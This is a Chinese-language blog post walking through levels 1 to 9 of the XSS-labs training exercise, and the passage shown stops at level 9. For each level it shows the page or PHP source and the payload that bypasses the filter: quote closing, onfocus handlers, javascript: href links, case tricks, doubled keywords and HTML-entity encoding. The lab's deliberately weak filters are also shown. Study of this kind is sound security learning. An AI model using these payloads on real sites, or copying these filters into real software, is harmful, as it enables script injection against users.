@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ycycyc - XSS-labs(包括多种绕过姿势)</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/tailwind.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/toc.css">
+    
+<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
+    <div class="container mx-auto flex items-center justify-between space-x-8">
+    
+      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
+        <a href="/" class="hover:text-white transition-colors select-none">
+          ycycyc
+        </a>
+      </h1>
+  
+    <!-- 大屏幕 -->
+      <nav class="hidden md:block">
+        <ul class="flex space-x-6">
+          
+            <li>
+              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Home
+              </a>
+            </li>
+          
+            <li>
+              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Archives
+              </a>
+            </li>
+          
+            <li>
+              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Categories
+              </a>
+            </li>
+          
+            <li>
+              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Tags
+              </a>
+            </li>
+          
+            <li>
+              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                About
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+  
+      <!-- 小屏幕 -->
+      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </div>
+  
+    <!-- 折叠菜单 -->
+    <nav id="mobile-menu" class="hidden bg-black">
+      <ul class="space-y-2 py-4 px-6">
+        
+          <li>
+            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
+              Home
+            </a>
+          </li>
+        
+          <li>
+            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
+              Archives
+            </a>
+          </li>
+        
+          <li>
+            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
+              Categories
+            </a>
+          </li>
+        
+          <li>
+            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
+              Tags
+            </a>
+          </li>
+        
+          <li>
+            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
+              About
+            </a>
+          </li>
+        
+      </ul>
+    </nav>
+   <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F9W89HDHWL"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F9W89HDHWL');
+</script>
+  
+    <!-- RSS Link -->
+    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+  </header>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/js/search.js"></script>
+  <script>
+        document.addEventListener("DOMContentLoaded", () => {
+    const menuToggle = document.getElementById("menu-toggle");
+    const mobileMenu = document.getElementById("mobile-menu");
+
+    menuToggle.addEventListener("click", () => {
+        if (mobileMenu.classList.contains("hidden")) {
+        mobileMenu.classList.remove("hidden");
+        } else {
+        mobileMenu.classList.add("hidden");
+        }
+    });
+    });
+
+  </script>
+  
+
+    <style>
+        p {
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+            font-size: 1.1rem;
+        }
+        figure {
+            margin: 0 !important;
+        }
+        pre {
+            padding: 0 !important;
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        td {
+            padding: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            margin-top: 0 !important;
+            margin-bottom: 1rem !important;
+        }
+        @media (min-width: 1024px) {
+            #middle-box {
+                min-width: 56rem;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
+    <!-- 文章标题 -->
+    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">XSS-labs(包括多种绕过姿势)</h1>
+
+    <!-- 发布时间 -->
+    <p class="text-hacker-color3 text-center text-sm mb-4">
+        2025-05-28
+    </p>
+
+    <!-- 文章内容 -->
+    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
+        <div id="middle-box">
+            <h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>查看网站源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function()</span><br><span class="line">&#123;</span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将test的值插入到了html标签中</p>
+<p>直接GET传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505182353309.png" alt="image-20250518235305246"></p>
+<p>源代码也不存在任何过滤</p>
+<h1 id="level2（闭合）"><a href="#level2（闭合）" class="headerlink" title="level2（闭合）"></a>level2（闭合）</h1><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505182355469.png" alt="image-20250518235554410"></p>
+<p>直接输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>没有弹窗，查看网页的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现输入的test作为value值被服务端转义了</p>
+<p>既然是value值被转移了，那么提前闭合点value值不就能够避免转义了吗</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505190003902.png" alt="image-20250519000339865"></p>
+<h1 id="level3（onfocus事件）"><a href="#level3（onfocus事件）" class="headerlink" title="level3（onfocus事件）"></a>level3（onfocus事件）</h1><p>输入<script>alert()</script></p>
+<p>页面没有弹窗，查看网页源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先是单引号闭合</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和&#x27;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&amp;lt;&#x27;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&amp;lt;&#x27;&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现value值中的&lt;&gt;大于小于符号也进行了HTML实体化编码</p>
+<p>查看一下第三关的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现了htmlspecialchars()函数</p>
+<p>首先对大小于符号进行了编码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505190018204.png" alt="image-20250519001808166"></p>
+<p>没有对单引号进行编码</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505190018475.png" alt="image-20250519001851444"></p>
+<p>对双引号进行了编码</p>
+<p>这里可以利用<strong>onfocus事件</strong>绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">onfocus事件</span><br><span class="line"></span><br><span class="line">在对象获得焦点的时候发生，执行javascript：获得焦点指的是通过tab导航或者是点击到一个可聚焦的元素，常见的可以获得焦点的元素</span><br><span class="line">&lt;input&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;select&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; (带有 href 属性)</span><br><span class="line"></span><br><span class="line">&lt;button&gt;</span><br><span class="line"></span><br><span class="line">任何设置了 tabindex 属性的元素</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>比如这里</p>
+<p><img src="C:\Users\cj\AppData\Roaming\Typora\typora-user-images\image-20250519003256414.png" alt="image-20250519003256414"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>单引号闭合前后的单引号，配合javascript伪协议执行javascript代码<img src="C:\Users\cj\AppData\Roaming\Typora\typora-user-images\image-20250519003427257.png" alt="image-20250519003427257"></p>
+<p><strong>触发条件是再次点击输入框，即通过点击input输入框是对象获得焦点从而执行javascript:</strong></p>
+<h1 id="level4（onfocus事件加闭合引号）"><a href="#level4（onfocus事件加闭合引号）" class="headerlink" title="level4（onfocus事件加闭合引号）"></a>level4（onfocus事件加闭合引号）</h1><p>依旧是大小于符号被过滤掉了</p>
+<p>查看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接移除了&gt;&lt;符号，并对input输入的内容进行了HTML实体编码</p>
+<p>同样使用level3的<strong>onfocus事件</strong>绕过</p>
+<p>有网页的源码就可以得知</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191600693.png" alt="image-20250519160001562"></p>
+<p>这里是双引号闭合</p>
+<p>所以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191601096.png" alt="image-20250519160144032"></p>
+<p>输入上面的内容之后再次点击输入框，原理与上面level3相同</p>
+<h1 id="level5（-a-标签的href属性加闭合）"><a href="#level5（-a-标签的href属性加闭合）" class="headerlink" title="level5（ &lt; a &gt; 标签的href属性加闭合）"></a>level5（ &lt; a &gt; 标签的href属性加闭合）</h1><p>输入&lt;&gt;</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191605369.png" alt="image-20250519160501308"></p>
+<p>发现同样存在HTML实体化编码</p>
+<p>输入的<code>&lt;script&gt;</code>被替换为了<code>&lt;scr_ipt&gt;</code></p>
+<p>这里同样是双引号闭合，尝试双引号闭合的onfocus绕过</p>
+<p>构造paoload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191608262.png" alt="image-20250519160832193"></p>
+<p>为什么没有成功的弹窗可想而知</p>
+<p><code>onfocus</code>被替换为了<code>o_nfocus</code></p>
+<p>观察源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现这里存在一个函数strtolower()将我们输入的内容全部转化为小写</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191613156.png" alt="image-20250519161319065"></p>
+<p>也对上面这两个关键字符进行了替换</p>
+<p>由于strtolower()函数的存在，我们就不能够使用大小写绕过来使用js标签弹窗了</p>
+<p>这里可以使用</p>
+<p><code>&lt;a&gt;标签的href属性</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href属性的意思是 当标签&lt;a&gt;被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码</span><br></pre></td></tr></table></figure>
+
+<p>添加一个新的标签必须要闭合前面的标签，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert()&gt;sss&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191620392.png" alt="image-20250519162001312"></p>
+<p><strong>注意</strong></p>
+<p><code>&lt;a&gt;</code>标签是HTML的超链接锚点，href用于指定链接目标（同样可以使用javascript：伪协议执行javascript代码）这里的sss就是链接现实的文本</p>
+<h1 id="level6（大小写）"><a href="#level6（大小写）" class="headerlink" title="level6（大小写）"></a>level6（大小写）</h1><p>这一关没有什么特别的输入一些简单的语句进行测试，与上面的level5相同</p>
+<p>将<code>on</code>替换为了<code>o_n</code>，将<code>script</code>替换为<code>scr_ipt</code></p>
+<p>测试发现不存在大小写过滤</p>
+<p>直接使用大小写绕过</p>
+<p>构造payload(双引号闭合)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;SCRipt&gt;alert()&lt;/SCRipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191633791.png" alt="image-20250519163309701"></p>
+<p>查看一下这一关的过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到通过下划线过滤了很多关键字，但是没有大小写过滤</p>
+<h1 id="level7（双写）"><a href="#level7（双写）" class="headerlink" title="level7（双写）"></a>level7（双写）</h1><p>同样进行关键字过滤的尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ONFocus &lt;SCRipt&gt; &lt;a href=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入的语句变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">focus &lt;&gt; &lt;a =java:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到过滤了<code>on,script,href</code>，并且进行小写转化</p>
+<p>尝试使用双写绕过</p>
+<p>payload（双引号闭合）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191653816.png" alt="image-20250519165335765"></p>
+<p>过滤删除了<code>script</code>之后前后的语句拼接成了新的<code>script</code>标签</p>
+<h1 id="level8（ascii转unicode编码浏览器自动解码）"><a href="#level8（ascii转unicode编码浏览器自动解码）" class="headerlink" title="level8（ascii转unicode编码浏览器自动解码）"></a>level8（ascii转unicode编码浏览器自动解码）</h1><p>测试存在什么过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191659575.png" alt="image-20250519165919532"></p>
+<p>可以看到上面的两个地方调用了传入的参数</p>
+<p>对关键的标签都进行了过滤，存在小写转化函数</p>
+<p>还添加了HTML实体化编码将双引号编码了，说明无法添加新的标签来绕过对应的过滤</p>
+<p>这里可以利用<strong>href的隐藏属性自动解析HTML实体化编码（ascii转unicode）</strong></p>
+<p>由于href标签这里可以直接插入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()进行ascii转Unicode编码</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191707374.png" alt="image-20250519170729329"></p>
+<p><strong>为什么直接进行unicode编码绕不过，而进行ascii转unicode编码就可以绕过？</strong></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191713293.png" alt="image-20250519171340243"></p>
+<p>浏览器 <strong>不会自动解码</strong> <code>\u0061</code> 等 Unicode 序列，点击后无效。</p>
+<p>浏览器 <strong>会自动解码</strong> HTML 实体，转换为真实字符。</p>
+<h1 id="level9（内联注释绕if）"><a href="#level9（内联注释绕if）" class="headerlink" title="level9（内联注释绕if）"></a>level9（内联注释绕if）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p>进行基本的过滤测试</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191723623.png" alt="image-20250519172354556"></p>
+<p>href标签处没有传参成功，其他过滤于上面相同</p>
+<p>查看源码：</p>
